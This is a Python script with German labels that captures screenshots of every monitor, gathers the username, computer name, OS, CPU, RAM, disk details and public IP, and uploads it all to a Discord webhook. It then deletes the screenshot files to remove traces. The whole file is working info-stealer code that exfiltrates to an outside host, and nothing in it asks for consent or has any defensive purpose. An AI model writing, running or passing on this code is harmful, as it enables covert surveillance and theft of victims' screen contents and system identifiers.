import mss
import os
import tempfile
import platform
import getpass
import requests
import psutil
from discord_webhook import DiscordWebhook, DiscordEmbed

def take_screenshot():
    with mss.mss() as sct:
        monitors = sct.monitors
        
        screenshot_paths = []
        for i, monitor in enumerate(monitors):
            monitor_number = i + 1
            temp_dir = tempfile.gettempdir()
            screenshot_path = os.path.join(temp_dir, f"screenshot_{monitor_number}.png")
            sct_img = sct.grab(monitor)
            mss.tools.to_png(sct_img.rgb, sct_img.size, output=screenshot_path)
            screenshot_paths.append(screenshot_path)
        
    return screenshot_paths

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        public_ip = response.json()['ip']
        return public_ip
    except Exception as e:
        print("Fehler beim Abrufen der öffentlichen IP-Adresse:", e)
        return None

def get_system_info():
    username = getpass.getuser()

    computername = platform.node()

    os_info = platform.platform()

    cpu_info = platform.processor()

    ram_info = f"{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB"

    disk_info = []
    for partition in psutil.disk_partitions():
        disk_usage = psutil.disk_usage(partition.mountpoint)
        disk_info.append(f"{partition.device} - {round(disk_usage.total / (1024 ** 3), 2)} GB")

    return username, computername, os_info, cpu_info, ram_info, disk_info

if __name__ == "__main__":
    webhook_url = 'https://discord.com/api/webhooks/XXXXXXXXX/YYYYYYYYYYYYYYYYYYY'

    screenshot_paths = take_screenshot()

    public_ip = get_public_ip()

    username, computername, os_info, cpu_info, ram_info, disk_info = get_system_info()

    webhook = DiscordWebhook(url=webhook_url)

    for screenshot_path in screenshot_paths:
        with open(screenshot_path, "rb") as file:
            webhook.add_file(file=file.read(), filename=os.path.basename(screenshot_path))

    embed = DiscordEmbed(title='Screenshots mit PC-Informationen und öffentlicher IP-Adresse', color=242424)
    embed.add_embed_field(name="Benutzername", value=username)
    embed.add_embed_field(name="Computernamen", value=computername)
    embed.add_embed_field(name="Betriebssystem", value=os_info)
    embed.add_embed_field(name="CPU", value=cpu_info)
    embed.add_embed_field(name="RAM", value=ram_info)
    embed.add_embed_field(name="Festplatten", value="\n".join(disk_info))
    embed.add_embed_field(name="Öffentliche IP-Adresse", value=public_ip)
    
    webhook.add_embed(embed)

    response = webhook.execute()

    print("Screenshots und Embed mit PC-Informationen und öffentlicher IP-Adresse erfolgreich an Discord gesendet!")

    for screenshot_path in screenshot_paths:
        os.remove(screenshot_path)

    print("Screenshots erfolgreich gelöscht!")
